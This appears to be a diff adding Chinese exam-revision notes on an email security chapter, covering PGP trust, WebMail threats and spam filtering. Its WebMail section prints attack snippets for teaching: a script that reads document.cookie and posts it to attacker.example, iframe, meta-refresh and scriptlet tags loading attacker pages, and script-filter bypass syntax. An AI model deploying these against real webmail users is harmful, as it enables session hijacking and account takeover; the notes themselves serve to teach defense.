+  <p>③ 「因此，<b>在没有绝对信任的情况下，需要至少 X 个签名是可信的，或者至少 Y 个签名是可信的，或者上述两种情况的某种组合。</b>」</p>
+  <p><b>课本给的例子</b>：「如果设置 <b>X = 1，Y = 2</b>，则表示<b>一个「一直信任」的密钥拥有者签名的公钥即为合法密钥</b>，而<b>两个「部分信任」的密钥拥有者签名的公钥也为合法密钥</b>。」</p>
+</div>
+
+<div class="box">
+  <div class="box-t">自己再验算两个组合（答简答 5 时"举例说明"这四个字就靠它）</div>
+  <p>设 X = 2，Y = 4 ⇒ 一直信任每个记 <b>1/2</b>，部分信任每个记 <b>1/4</b>，加起来 <b>≥ 1</b> 才算合法。</p>
+  <ul>
+  <li>2 个"一直信任" ⇒ 1/2 + 1/2 = <b>1</b> ✔ 合法</li>
+  <li>4 个"部分信任" ⇒ 4 × 1/4 = <b>1</b> ✔ 合法</li>
+  <li>1 个"一直信任" + 2 个"部分信任" ⇒ 1/2 + 1/4 + 1/4 = <b>1</b> ✔ 合法（这就是课本说的"某种组合"）</li>
+  <li>1 个"一直信任" + 1 个"部分信任" ⇒ 1/2 + 1/4 = 3/4 &lt; 1 ✘ 不合法</li>
+  <li>只要有 1 个"绝对信任" ⇒ <b>不用算，直接合法</b></li>
+  </ul>
+  <p class="small"><b>孤立用户的情形</b><span class="bref">课本 p.316</span>：「如果一个用户是拥有一个或多个<b>未知用户签名</b>的<b>孤立用户</b>，则他的公钥可能是你从公钥服务器中得到的。
+  <b>由于没有信任者的签名，因此 PGP 认为该用户的公钥是不合法的。</b>」——加权和为 0，自然不合法。</p>
+</div>
+
+<h5 style="margin:.6em 0 .2em;font-size:.98em">公钥的撤销，与 PGP 的薄弱环节 <span class="bref">课本 p.316</span></h5>
+<p>「当用户怀疑自己的私钥泄露或想终止其使用，可以<b>撤销</b>自己当前正在使用的公钥。通常情况下，撤销一个公钥需要公钥所有者
+<b>发布一个由他签名的公钥撤销证书</b>，该证书格式和一般签名证书一样，但<b>有一个标志指示此证书的目的是撤销该公钥的使用</b>。
+需要注意的是<b>该证书所用的签名私钥应与所撤销的公钥相对应</b>。」</p>
+
+<div class="box trap">
+  <div class="box-t">⚠ PGP 的两处已知弱点（简答 8「比较 PEM/S-MIME/PGP 优缺点」的扣分点）</div>
+  <p><b>① 撤销机制弱。</b><span class="bref">课本原文</span>「PGP <b>缺少 PKI 体系那样严格的证书撤销机制</b>，很难确保没有人使用一个已不安全的密钥，
+  <b>是 PGP 安全体系中比较薄弱的环节</b>。」<span class="small">→ 根因：没有权威中心，撤销证书只能靠"自己喊、别人听见"，喊了没人收到也没办法。</span></p>
+  <p><b>② SHA-1 已被攻破，牵连身份签名。</b><span class="bref">课本 p.316</span>「2019 年 10 月，密码学家<b>盖坦·勒伦和托马·佩林</b>宣布已经对 SHA-1 成功计算出<b>第一个选择前缀冲突</b>，并选择 <b>PGP/GnuPG 信任网络</b>来演示 SHA-1 的前缀冲突攻击。
+  出于兼容性原因，默认情况下 <b>GnuPG（1.4 版）的旧分支仍默认使用 SHA-1 进行身份认证</b>。
+  使用 SHA-1 选择前缀冲突，创建了两个具有不同 UserID 的 PGP 密钥：<b>密钥 B 是 Bob 的合法密钥（由信任网签名），密钥 A 是用 Alice ID 伪造的密钥</b>，
+  并将密钥 B 中的签名转移到密钥 A 中。<b>由于哈希冲突，该签名在密钥 A 中仍然有效，这样 Bob 可以用 Alice 的名字控制密钥 A</b>，因此 <b>Bob 可冒充 Alice，并以她的名字签署任何文件</b>。
+  <b>GnuPG 2.2.18 版（2019 年 11 月 25 日发布）已采取措施：对 2019-01-19 之后基于 SHA-1 创建的身份签名视为无效。</b>」</p>
+</div>
+
+<h3>2.9 PGP 最大的工程优势（简答 9 的答案）<span class="bref">课本 p.314</span></h3>
+<div class="box good">
+  <div class="box-t">一句话：它谁也不用求</div>
+  <p><b>课本原文</b>：「由于 PGP <b>只是对邮件正文进行处理</b>，而对 10.1 节介绍的邮件系统的<b>体系结构及收发协议没有做任何修改</b>，因此，
+  <b>只要收发双方的用户代理支持 PGP，就可在现有的邮件系统中进行安全的电子邮件交换，而无须对邮件服务器进行任何更改。</b>」</p>
+  <p>再补一条工程上的硬理由：邮件的<b>信封／首部（收发件人地址、路由信息）必须保持明文</b>，否则中间的邮件服务器<b>无法投递、无法路由</b>。
+  所以加密方案<b>只能、也必须</b>止步于"正文"这一层。</p>
+</div>
+<h2><span class="n">§3</span>WebMail 安全威胁及防范 <span class="pref">PPT p.29–36（8 页，占正文 22%）</span> <span class="bref">课本 10.4</span></h2>
+
+<div class="chain">
+  <div class="chain-i prev"><div class="chain-k">承上</div><div class="chain-b">§2 的 PGP 保住了<b>邮件内容</b>，但它保不住<b>你的邮箱账号</b>。</div></div>
+  <div class="chain-i now"><div class="chain-k">本节</div><div class="chain-b">用浏览器收发邮件（WebMail）非常方便，代价是<b>把 Web 应用的全套漏洞搬进了邮箱</b>。</div></div>
+  <div class="chain-i next"><div class="chain-k">留下的坑</div><div class="chain-b">账号守住了，<b>还是有人天天往你邮箱里灌垃圾</b> → §4</div></div>
+</div>
+
+<div class="scene">
+  <div class="scene-k">PPT p.29 · 老师的开场（原话）</div>
+  <p class="scene-q">WebMail 不需借助专门的邮件客户端，只要能用浏览器上网就能收发邮件，极大地方便了用户。</p>
+  <div class="scene-b"><p>「但是，WebMail 的使用也带来了新的安全威胁，<b>前面介绍的 Web 应用所面临的很多安全问题同样在 WebMail 中存在</b>。」<br>
+  → 换句话说：<b>本节的三个威胁，本质上就是第 9 章的三个漏洞换了个场地。</b>看不懂就回头对第 9 章。</p></div>
+</div>
+
+<div class="box key">
+  <div class="box-t">简答 6「简要说明 WebMail 所面临的安全问题」的骨架 —— 就三条</div>
+  <p><b>① WebMail 暴力破解　② 恶意 HTML 邮件　③ Cookie 会话攻击</b><br>
+  这三条 <span class="pref">PPT p.31、p.36</span> 和课本 10.4 的三个小标题完全一致。<b>先把这三个名字记住，再往里填内容。</b></p>
+</div>
+
+<h3>3.1 WebMail 暴力破解 <span class="pref">PPT p.31</span> <span class="bref">课本 p.317</span></h3>
+
+<h4>攻击是怎么成立的</h4>
+<p><span class="bref">课本原文</span>：「在 WebMail 中，客户端（浏览器）与服务端的交互，基本上都是通过客户端<b>以提交表单的形式</b>交由服务端程序（如 CGI、ASP 等）处理来实现的，<b>WebMail 的密码验证即是如此</b>。
+用户在浏览器的表单元素里输入账户名、密码等信息并提交以后，服务端对其进行验证，<b>如果正确的话，则欢迎用户进入自己的 WebMail 页面；否则，返回一个出错页面给客户端</b>。」</p>
+
+<div class="box trap">
+  <div class="box-t">⚠ 漏洞的根子：服务器"对/错"回答得太诚实</div>
+  <p>攻击者<b>「不断地用不同的密码尝试登录，通过比较返回页面的异同，从而判断出邮箱密码是否破解成功」</b>。
+  破解工具（如 <b>wwwhack、小榕的溯雪</b>）<b>「本身就是一个功能完善的浏览器，通过分析和提取页面中的表单，给相应的表单元素挂上字典文件，再根据表单提交后返回的错误标志判断破解是否成功」</b>。</p>
+  <p><b>所以这类攻击成立需要两个条件：</b>① 能<b>无限次</b>试；② 每次都能<b>清楚地分辨</b>对与错。下面三种防范，就是分别掐这两条。</p>
+</div>
+
+<h4>三种防范措施，以及每一种自己的毛病（这个"优缺点成对"是考点）</h4>
+<table>
+<thead><tr><th style="width:6%" class="c">#</th><th style="width:12%">措施</th><th style="width:34%">怎么做</th><th>它自己带来的新问题</th></tr></thead>
+<tbody>
+<tr><td class="c">1</td><td><b>禁用账户</b></td><td>把受到暴力破解的账户<b>禁止一段时间登录，一般是 5～10 分钟</b>。</td><td><b>「如果攻击者总是尝试暴力破解，则该账户就一直处于禁用状态不能登录，导致真正的用户不能访问自己的邮箱，从而形成 DoS 攻击。」</b><br><span class="small">→ 防守动作本身变成了攻击手段，这是本章最漂亮的一个例子。</span></td></tr>
+<tr><td class="c">2</td><td><b>禁止 IP 地址</b></td><td>把进行暴力破解的 IP 地址<b>禁止一段时间不能使用 WebMail</b>。</td><td>「虽然在一定程度上解决了"禁用账户"带来的问题，但<b>更大的问题是，这势必导致在网吧、公司、学校甚至一些城域网内共用同一 IP 地址访问 Internet 的用户不能使用该 WebMail</b>。<br>如果攻击者<b>采用多个代理地址轮换攻击，甚至采用分布式的破解攻击</b>，那么"禁止 IP 地址"就难以防范了。」<br><span class="small">→ 一边误伤好人（一个 IP 后面是一整栋楼），一边挡不住坏人（换代理即可）。</span></td></tr>
+<tr><td class="c">3</td><td><b>登录检验</b><br><span class="small">（即验证码）</span></td><td>「这种防范措施<b>一般与上面两种防范措施结合起来使用</b>，在禁止不能登录的同时，返回给客户端的页面中<b>包含一个随机产生的检验字符串</b>，只有用户在相应的输入框里正确输入了该字符串才能进行登录，这样就能<b>有效避免上面两种防范措施带来的负面影响</b>。」</td><td>「不过，<b>攻击者依然有机可乘</b>：通过开发出相应的工具<b>提取返回页面中的检验字符串</b>，再将此检验字符串作为表单元素值提交，那么又可以形成有效的 WebMail 暴力破解了。<br><b>如果检验字符串是包含在图片中，而图片的文件名又是随机产生的，那么攻击者就很难开发出相应的工具进行暴力破解了。</b>」<br><span class="small">→ 这一句解释了<b>验证码为什么必须是图片</b>：只要它在 HTML 文本里，脚本就能读走。</span></td></tr>
+</tbody>
+</table>
+
+<div class="box">
+  <div class="box-t">课本的结论：技术手段都靠不住，最后还得靠密码本身</div>
+  <p>「虽然 WebMail 的暴力破解有诸多的防范措施，但它还是很难被完全避免的。<b>如果 WebMail 系统把一分钟内 5 次错误的登录当成是暴力破解，那么攻击者就会在一分钟内只进行 4 次登录尝试。</b>
+  所以，防范 WebMail 暴力破解<b>还主要靠用户自己采取良好的密码策略，如密码足够复杂、密码差异化、密码定期更改等</b>。这样，攻击者就很难暴力破解成功。」</p>
+  <p class="small">「一分钟只试 4 次」这个细节值得记 —— 它说明<b>基于阈值的防御一定可以被"降速绕过"</b>。</p>
+</div>
+
+<h3>3.2 恶意 HTML 邮件 <span class="pref">PPT p.31–35</span> <span class="bref">课本 p.318–320</span></h3>
+
+<p><b>起点是一个格式问题</b><span class="bref">课本 p.318</span>：「电子邮件有两种格式：<b>纯文本（txt）和超文本（HTML）</b>。
+HTML 邮件由 HTML 语言写成，当通过支持 HTML 的邮件客户端或以浏览器登录进入 WebMail 查看时，<b>有字体、颜色、链接、图像和声音等</b>。<b>许多垃圾广告就是以 HTML 邮件格式发送的。</b>」</p>
+
+<div class="box trap">
+  <div class="box-t">⚠ 病根一句话：邮件正文变成了一个"会执行的网页"</div>
+  <p>纯文本邮件顶多骗你的眼睛；HTML 邮件里可以有<b>表单、脚本、外链、iframe</b>——它是在你的邮箱页面里跑起来的。
+  <b>攻击者要的不是让你看到什么，而是让你的浏览器替他做什么。</b></p>
+</div>
+
+<h4>(A) 用 HTML 表单偷偷改掉你的邮箱密码 <span class="bref">课本 p.318</span></h4>
+<div class="steps">
+  <div class="step"><div class="sb">攻击者<b>分析 WebMail 密码修改页面的各表单元素</b>，设计一个<b>隐含有同样表单的 HTML 页面</b>。</div>
+    <div class="sw">他要伪造的不是页面外观，而是<b>那个表单的提交结构</b>。</div></div>
+  <div class="step"><div class="sb"><b>预先给"新密码"表单元素赋值</b>（填成他自己知道的密码）。</div>
+    <div class="sw">这一步是关键：受害者从头到尾没输入过任何东西。</div></div>
+  <div class="step"><div class="sb">以 HTML 邮件发送给用户，<b>欺骗用户说在页面中提交某个表单或点击某个链接就能打开一个精彩网页</b>。</div>
+    <div class="sw">诱饵。用户以为自己在点"看图"。</div></div>
+  <div class="step"><div class="sb">用户照做后，<b>在打开"精彩网页"的同时，一个修改邮箱密码的表单请求已经发向 WebMail 系统</b>。</div>
+    <div class="sw"><b>为什么会成功：</b>用户此刻是<b>登录状态</b>，浏览器会自动带上他的会话凭证。<b>这就是第 9 章的 CSRF。</b></div></div>
+  <div class="step"><div class="sb"><b>「而这一切用户完全不知情，直到下次不能登录进自己邮箱的时候才会知道。」</b></div>
+    <div class="sw">攻击是静默的，发现时已经晚了。</div></div>
+</div>
+
+<div class="box good">
+  <div class="box-t">防范（课本给的原话，简答里要写）</div>
+  <p>「为了防止此类的 HTML 邮件欺骗，<b>在修改邮箱配置时，特别是修改邮箱密码和提示问题时，WebMail 系统有必要让用户输入旧密码加以确认</b>，
+  这样也能有效防止<b>截取到当前 WebMail 会话的攻击者</b>更改邮箱密码。」</p>
+  <p class="small">→ 为什么"输入旧密码"就能挡住：因为<b>旧密码是攻击者唯一伪造不了的东西</b>——他能借用你的会话，但不知道你的密码。</p>
+</div>
+
+<h4>(B) 在 HTML 邮件里嵌恶性脚本 <span class="pref">PPT p.31</span> <span class="bref">课本 p.318</span></h4>
+<p><span class="pref">PPT 原文</span>：「在 HTML 邮件中嵌入恶性脚本程序，攻击者还能进行很多破坏攻击，如
+<b>修改注册表、非法操作文件、格式化硬盘、耗尽系统资源、修改"开始"菜单</b>等，甚至能
+<b>删除和发送用户的邮件、访问用户的地址簿、修改邮箱账户密码</b>等。」<br>
+<span class="bref">课本补充</span>：「恶性脚本程序一般由 <b>JavaScript 或 VBScript</b> 脚本语言写成，内嵌在 HTML 语言中，
+通过调用 <b>ActiveX 控件</b>或者结合 <b>WSH</b> 来达到破坏攻击目的。」</p>
+
+<h4>(C) 绕过 WebMail 脚本过滤的四种方法 <span class="bref">课本 p.319</span></h4>
+<p>前提：「鉴于脚本程序可能带来的危险，WebMail 系统应尽量禁止 HTML 邮件中的脚本程序，即<b>过滤掉 HTML 源程序中能够使脚本程序运行的代码，如 script 元素等</b>。」
+—— 下面四种就是<b>「我不写 script 标签，照样让你执行」</b>。</p>
+<table class="tight">
+<thead><tr><th style="width:6%" class="c">#</th><th style="width:16%">方法</th><th>原理与写法</th></tr></thead>
+<tbody>
+<tr><td class="c">1</td><td><b>事件属性</b><br><span class="small">（事件句柄）</span></td><td>「除了 script 元素内的或在 script 元素内引入的脚本程序能在 HTML 页面装载时被运行，<b>使用事件属性也能调用脚本程序运行</b>，事件属性在 JavaScript 语言里被称为<b>事件句柄</b>，用于对页面上的某个特定事件（如鼠标点击、表单提交）做出响应，驱动 JavaScript 程序运行。」<br><code>&lt;tag attribute1 attribute2 onEventName ="javascript code;"&gt;</code></td></tr>
+<tr><td class="c">2</td><td><b>URI 的 scheme<br>设成 javascript</b></td><td>「URI 用于定位 Internet 上每种可用的资源。浏览器根据 URI 的资源类型（<b>URI scheme</b>）调用相应的程序操作该资源。<b>如果把一些元素的 URI 属性值的资源类型设为 javascript，则能够调用 JavaScript 程序运行</b>」（注意要用 <code>;</code> 分隔不同的 JavaScript 语句）。<br><code>&lt;tag attribute="javascript:javascript-code;"&gt;</code></td></tr>
+<tr><td class="c">3</td><td><b>SGML 字符引用</b><br><span class="small">（转十六进制）</span></td><td>「<b>字符引用</b>（character reference）是一种用来指定文档字符集中任何字符的独立编码机制，<b>以 &amp; 开始，以 ; 结束</b>。有两种表达方式：<b>数字字符引用和实体字符引用</b>。数字字符引用的语法为 <code>&amp;#D;</code>（D 代表一个十进制数），或 <code>&amp;#xH;</code>、<code>&amp;#XH;</code>（H 代表一个十六进制数）。」<br>例：<code>&amp;#65;</code>、<code>&amp;#x41;</code> 表示字母 <b>A</b>；<code>&amp;#27700;</code>、<code>&amp;#x6C34;</code> 表示汉字 <b>水</b>。<br><b>「攻击者常将 HTML 语句里的一些字符转为十六进制数，这样能避开 WebMail 系统对脚本程序的过滤。」</b><br><b class="mark">重要限制：「元素和属性不可以用字符引用表示。」</b><span class="small">（所以不能把 <code>script</code> 这个标签名本身编码掉。）</span></td></tr>
+<tr><td class="c">4</td><td><b>样式表 @import</b></td><td>「在 HTML 语言的 style 标签内可以用 <code>@import</code> 声明输入一个样式表。但是，<b>如果输入的资源类型或内容是 javascript，则 Internet Explorer 浏览器仍然会执行。</b>」</td></tr>
+</tbody>
+</table>
+
+<h4>(D) 不直接嵌，而是"引进来"——三种引入外部页面的写法 <span class="bref">课本 p.319–320</span></h4>
+<p>「除了可以在 HTML 邮件中直接嵌入脚本程序，攻击者还可以设计一些 HTML 代码，<b>在用户打开 HTML 邮件时，不知不觉引入另一个 HTML 文件，而此文件中正含有恶性代码</b>。
+这样不仅能直接绕过 WebMail 系统对脚本程序的过滤，<b>而且还能有效避开提供了防毒服务的邮件系统对恶意代码的查杀。</b>」</p>
+<div class="three">
+<div class="box" style="margin:.35em 0"><div class="box-t">① refresh 到另一个页面</div>
+<p><code>&lt;meta http-equiv="refresh"<br>content="1; URL=http://www.attacker.example/another.htm"&gt;</code></p></div>
+<div class="box" style="margin:.35em 0"><div class="box-t">② iframe 引入另一个页面</div>
+<p><code>&lt;iframe src="http://www.attacker.example/import.htm" frameborder="0"&gt;&lt;/iframe&gt;</code></p></div>
+<div class="box" style="margin:.35em 0"><div class="box-t">③ scriptlet 引入另一个页面</div>
+<p><code>&lt;object type="text/x-scriptlet" data=http://www.attacker.example/import.htm&gt;&lt;/object&gt;</code></p></div>
+</div>
+<p class="small">→ <b>为什么"引入"比"嵌入"更难防</b>：邮件本身干干净净，杀毒和过滤扫不出东西；恶意代码在你<b>打开邮件的那一刻</b>才从远端拉过来。<br>
+<span class="small">（示例域名一律用虚构的 <code>attacker.example</code>，课本原文用的是 attacker.com。）</span></p>
+
+<h4>(E) 让恶意 HTML 邮件更隐蔽的三招 <span class="bref">课本 p.320</span></h4>
+<ul>
+<li><b>配合邮件欺骗技术</b>，使用户不会怀疑收到的邮件，并且攻击者也能隐藏自己的行踪。</li>
+<li><b>把 HTML 邮件设计成看起来像 TXT 邮件。</b><span class="small">（你以为纯文本没有危险，恰恰中招。）</span></li>
+<li>有时可以<b>把 HTML 邮件中的恶意代码放在一个隐藏的层里面</b>，表面上看不出任何变化。</li>
+</ul>
+
+<div class="box trap">
+  <div class="box-t">⚠ 课本对防范的态度很悲观，答题时要照实写</div>
+  <p>① <b>「针对恶意脚本程序的影响，对用户常见的建议办法是提高浏览器的安全级别，如禁用 ActiveX、禁用脚本等，但这并不是一个很好的办法，因为这样会影响到用户对其他正常 HTML 页面的浏览。即使浏览器达到了最高级别，依然对某些利用了浏览器的安全漏洞来实现攻击目的的恶意代码无济于事。」</b></p>
+  <p>② <b>「面对恶意 HTML 邮件，WebMail 系统和用户似乎都没有很好的解决办法」</b>，虽然许多 WebMail 系统已经能够过滤掉很多恶意代码，「但要想彻底过滤掉恶性代码并不是一件容易的事情，<b>攻击者总能利用 WebMail 系统过滤机制和浏览器的漏洞找到办法绕过种种过滤</b>」。</p>
+  <p>③ <b class="mark">「虽然一些电子邮件系统会在 WebMail 系统上对 HTML 邮件中的恶意代码进行过滤，但在 POP3 服务器上并不会进行过滤。所以，如果是通过邮件客户端收取邮件，仍然要谨防恶意 HTML 邮件的危害。」</b><span class="small">→ 这一条最容易被忽略：<b>换个客户端，过滤就没了。</b></span></p>
+</div>
+
+<h4>(F) PPT 贴的三个真实钓鱼邮件截图讲了什么 <span class="pref">PPT p.32–35</span></h4>
+<p class="small">下面是对 PPT 那四张截图的<b>文字复述</b>（不复现像素）。它们的价值在于<b>「破绽在哪里」</b>。</p>
+<table class="tight">
+<thead><tr><th style="width:20%">案例</th><th style="width:34%">画面上是什么</th><th>破绽 / 考点</th></tr></thead>
+<tbody>
+<tr><td><b>希拉里竞选团队主席被钓</b><br><span class="pref">PPT p.32</span> <span class="bref">课本图 10-5</span></td><td><b>2016 年 3 月 19 日</b>，竞选团队主席 <b>John Podesta</b> 收到一封伪装成 <b>Google</b> 的警告邮件，标题 “Sign-in attempt was blocked”，正文红底大字 “Someone has your password”，列出登录时间、地点、浏览器，下面是一个蓝色按钮 <b>CHANGE PASSWORD</b>。</td><td>鼠标悬停时状态栏显示的真实地址是 <code>https://www.google.com/amp/<b>tiny.cc/…</b></code> —— <b>前半截 google.com 只是幌子，真正跳转的是短链接 tiny.cc</b>。<br>Podesta <b>点击了该链接，泄露了自己的邮箱密码，攻击者由此获取了他邮箱里的所有邮件</b>。<br><span class="small"><b>教训：看链接要看"最终去哪"，不是"开头是什么"。</b></span></td></tr>
+<tr><td><b>假冒网易邮箱管理员</b><br><span class="pref">PPT p.33–34</span></td><td>页面完全套用网易 VIP 邮箱的界面，标题「重要通知」，正文：「我们的记录表明，最近有（2）条消息已发送给您，但尚未成功传递到您的邮箱。我们建议您及时还原消息，以避免被拒绝。请给我们 24 小时以恢复消息」，中间一个橙色按钮<b>「在此处登录以恢复消息」</b>，下面写「无法还原邮件将导致您的邮件被退回」。</td><td>浏览器状态栏里的真实链接是<br><code>count.mail.163.com.<b>neteaseushwmail.com</b>/…</code><br><b>真正的主域名是 neteaseushwmail.com，前面那串 count.mail.163.com 只是它的子域名。</b><br><span class="small"><b>教训：域名从右往左读。</b>最后一个点之前那两截才是真身。<br>另外注意话术：<b>制造紧迫感（24 小时）+ 威胁后果（邮件被退回）</b>，这是钓鱼邮件的标准配方。</span></td></tr>
+<tr><td><b>课本图 10-2 欺骗邮件</b><br><span class="bref">课本 p.309</span></td><td>发件人显示为「<b>网易账号中心</b>」，标题「有一项新的监管政策会影响发送到您邮箱的传入邮件」，落款是网易 VIP 的 Logo。</td><td>发件人姓名后面的真实地址是 <code>czfyjlh@163.com</code>，<b>根本不是网易账号中心的邮箱（通常是 admin@163.com）</b>。<br><span class="small">→ 对应 §1.5 的「电子邮件欺骗」：<b>「发件人姓名」是可以随便填的</b>。</span></td></tr>
+</tbody>
+</table>
+
+<h3>3.3 Cookie 会话攻击 <span class="pref">PPT p.36</span> <span class="bref">课本 p.320–321</span></h3>
+
+<div class="scene">
+  <div class="scene-k">先想清楚 Cookie 为什么存在</div>
+  <p class="scene-q">如果每点一下都要重新输密码，谁受得了？</p>
+  <div class="scene-b"><p><span class="bref">课本原文</span>「当用户输入邮箱账户和密码登录进入 WebMail 以后，<b>如果再让用户对每一步操作都输入密码加以确认就会让人不悦</b>。
+  所以 WebMail 系统一般有必要进行<b>用户会话跟踪</b>，用到的会话跟踪技术主要有两种：<b>Cookie 会话跟踪和 URL 会话跟踪</b>。」<br>
+  → <b>Cookie 是"免密码通行证"。既然它能代替密码，偷到它就等于偷到密码。</b></p></div>
+</div>
+
+<h4>攻击者怎么拿到 Cookie</h4>
+<p><span class="pref">PPT p.36 原文</span>：「攻击者获取用户 WebMail 的 Cookie 信息的方法主要有<b>内网监听</b>和 <b>XSS 攻击</b>。」<br>
+<span class="bref">课本补充</span>：「如果 WebMail 系统存在上一章介绍的<b>跨站脚本执行漏洞</b>，那么攻击者就能欺骗用户从而获取 Cookie 信息。」
+「<b>含有恶性脚本程序的 HTML 邮件能使攻击者获取 WebMail 的 Cookie 信息</b>。HTML 邮件中的脚本程序<b>先提取当前 WebMail 的 Cookie 信息，然后把它赋值给某个表单元素，再将表单自动提交给攻击者</b>，攻击者从而获得 Cookie 会话信息。」</p>
+
+<div class="box">
+  <div class="box-t">课本给的代码例（读懂这四行就够了）<span class="bref">课本 p.320</span></div>
+  <p><code>&lt;form method="post" action="http://attacker.example/getcookie.cgi" name="myform"&gt;</code><br>
+  <code>&nbsp;&nbsp;&lt;input name="session" type="hidden"&gt;</code><br>
+  <code>&lt;/form&gt;</code><br>
+  <code>&lt;script&gt;</code>（脚本内）<br>
+  <code>&nbsp;&nbsp;var cookie=(document.cookie);</code>　　← ① 读出当前页面的 Cookie<br>
+  <code>&nbsp;&nbsp;document.myform.session.value=cookie;</code>　← ② 塞进隐藏表单域<br>
+  <code>&nbsp;&nbsp;document.myform.submit();</code>　　　　← ③ 自动提交给攻击者<br>
+  <code>&lt;/script&gt;</code></p>
+  <p class="small">课本原代码里还有一句 <code>alert(cookie);</code> 并注释「<b>这一句用于显示当前 cookie 信息。当然，攻击者不会这样做</b>」——真实攻击是<b>无声</b>的。
+  <code>getcookie.cgi</code> 是<b>存放在攻击者 Web 服务器上的一个 CGI 程序，用于获取表单提交过来的 Cookie 信息，并且记录下来或者通知攻击者</b>。
+  「当然，攻击者会把 HTML 邮件、getcookie.cgi 程序设计得更隐蔽，更具欺骗性，让用户难以察觉。」</p>
+</div>
+
+<h4>拿到之后还得让浏览器"认"它 —— 临时 Cookie vs 持久 Cookie</h4>
+<p>「攻击者在获取 Cookie 信息之后，<b>还要让此 Cookie 信息由浏览器来存取从而与 WebMail 系统建立会话，这样才能侵入用户的 WebMail 邮箱。</b>」</p>
+<table class="tight">
+<thead><tr><th style="width:16%">类型</th><th style="width:26%">存在哪</th><th>攻击者怎么用</th></tr></thead>
+<tbody>
+<tr><td><b>持久型 Cookie</b></td><td>存在<b>硬盘上的 Cookie 文件</b>里</td><td>「攻击者所要做的是<b>把这个信息复制到自己的 Cookie 文件中去</b>，由浏览器存取该 Cookie 信息从而与 WebMail 系统建立会话。」<br><span class="small">→ <b>很省事。所以持久型 Cookie 危险得多。</b></span></td></tr>
+<tr><td><b>临时 Cookie</b></td><td><b>存储在内存中</b>，「<b>并不容易让浏览器存取</b>」</td><td>要让浏览器接受它，攻击者可以<b>编辑内存中的 Cookie 信息</b>，或者<b>修改公开源代码的浏览器</b>让它能编辑 Cookie。<br>「不过这样都不是很简便的方法，<b>简便的方法是使用 Achilles 程序</b>。<b>Achilles 是一个 HTTP 代理服务器，能够截取浏览器和 Web 服务器间的 HTTP 会话信息，并且在代理转发数据之前可以编辑 HTTP 会话以及临时 Cookie 信息。</b>」</td></tr>
+</tbody>
+</table>
+
+<div class="box good">
+  <div class="box-t">防范（两个层面，答题分开写）</div>
+  <p><b>系统侧</b>：<span class="pref">PPT p.36</span>「<b>WebMail 系统应该避免使用持久型 Cookie 会话跟踪</b>，使攻击者在 Cookie 会话攻击上不能轻易得逞。」
+  <span class="small">（理由见上表：持久型只要复制文件就能用，临时的还得靠 Achilles 这类工具折腾。）</span></p>
+  <p><b>用户侧</b>（课本列了三条）：<br>
+  ① <b>设置浏览器的 Cookie 安全级别，阻止所有 Cookie 或者只接受某几个域的 Cookie</b>；<br>
+  ② <b>使用 Cookie 管理工具，增强系统 Cookie 安全，如 Cookie Pal、Burnt Cookie 等</b>；<br>
+  ③ <b>及时给浏览器打补丁，防止 Cookie 信息泄漏。</b></p>
+</div>
+
+<div class="box key">
+  <div class="box-t">三个威胁串成一条线（这样记不会漏）</div>
+  <p><b>暴力破解</b>＝硬闯大门（猜密码）→ 挡住了，就<b>骗你自己开门</b>（恶意 HTML 邮件让你替他提交表单）→ 还嫌麻烦，干脆<b>偷走通行证</b>（Cookie 会话攻击，连密码都不用知道）。<br>
+  三者层层递进，<b>后一个都比前一个更省事、更隐蔽</b>。而且它们互相配合：<b>恶意 HTML 邮件正是偷 Cookie 的主要手段之一。</b></p>
+</div>
+<h2><span class="n">§4</span>垃圾邮件防范 <span class="pref">PPT p.38–41（4 页）</span> <span class="bref">课本 10.5</span></h2>
+
+<div class="chain">
+  <div class="chain-i prev"><div class="chain-k">承上</div><div class="chain-b">§2 保住了内容，§3 保住了账号 —— 可<b>邮箱还是天天被灌</b>。</div></div>
+  <div class="chain-i now"><div class="chain-k">本节</div><div class="chain-b">这是 §1 里「措施三：邮件服务器安全增强」的落地：<b>让服务器自己学会判断"这封信该不该收"</b>。</div></div>
+  <div class="chain-i next"><div class="chain-k">留下的坑</div><div class="chain-b">三类方法各有各的死角，<b>没有一种能单独用</b>，只能叠起来打。</div></div>
+</div>
+
+<div class="scene">
+  <div class="scene-k">PPT p.38 · 老师的开场（这就是本节全部难点所在）</div>
+  <p class="scene-q">从用户的角度看，正常邮件与垃圾邮件的主要区别是<b>该邮件是否是用户所希望收到的邮件</b>。</p>
+  <div class="scene-b">
+    <p>「用户查看邮件内容后，<b>很容易判断出一封邮件是不是自己想要的邮件</b>。但是，<b>邮件服务器要判断一封邮件是不是垃圾邮件则要困难得多</b>。」</p>
+    <p><span class="bref">课本 p.321 补了原因</span>：「因为<b>人类语言种类众多，人们对信息的感知与接受除了文字，还有图形以及对文字本身的联想</b>，所以很难建立一个好的、通用的并且高效的<b>语义分析模型</b>来分析一封电子邮件的内容是否正常。另外，<b>人为建立一组判定规则也不具有普遍意义，因为每个人对邮件的感受是千差万别的</b>。」</p>
+    <p><b>关键结论：垃圾邮件的定义是"主观的"，而机器只会算客观特征。</b>整节的所有技术，都是在<b>用客观特征去逼近一个主观判断</b> —— 这就是它们全都会误判的根本原因。</p>
+  </div>
+</div>
+
+<h3>4.1 垃圾邮件是什么、危害在哪 <span class="bref">课本 p.309</span></h3>
+<dl class="kv">
+<dt>定义</dt><dd><b>未经用户请求强行发送到用户邮箱中的、不受用户欢迎、难以退掉的电子邮件或电子邮件列表</b>，包括广告邮件、骚扰邮件、传播违法信息邮件等。</dd>
+<dt>危害（四条）</dt><dd>① <b>增加了网络负载，影响网络传输速度</b>；② <b>耗费收件人的时间、精力和金钱，严重时可耗尽收件人邮箱的存储空间</b>；③ <b>影响邮箱服务提供者的形象</b>；④ <b>频繁转发垃圾邮件的主机常会被因特网服务提供商列入垃圾邮件数据库，导致该主机访问网络受限</b>。</dd>
+</dl>
+
+<h3>4.2 垃圾邮件的特征 <span class="pref">PPT p.39</span> <span class="bref">课本 p.322</span></h3>
+
+<p><b>为什么先讲特征</b>：<span class="bref">课本 p.323</span>「<b>反垃圾邮件技术主要以上特征作为检测依据。</b>」——特征就是后面所有检测方法的原料。<br>
+课本先说清楚邮件的构成：「电子邮件主要由<b>邮件地址</b>（包括收发件人邮箱、收发邮件的 IP 地址）、<b>主题</b>、<b>信件内容</b>（关键字、正文、附件）等组成」。</p>
+
+<h4>(A) 七个"组成要素"特征 <span class="pref">PPT p.39 完整列了这七条</span></h4>
+<table class="tight">
+<thead><tr><th style="width:6%" class="c">#</th><th style="width:16%">特征</th><th style="width:24%">PPT 的说法</th><th>课本的解释</th></tr></thead>
+<tbody>
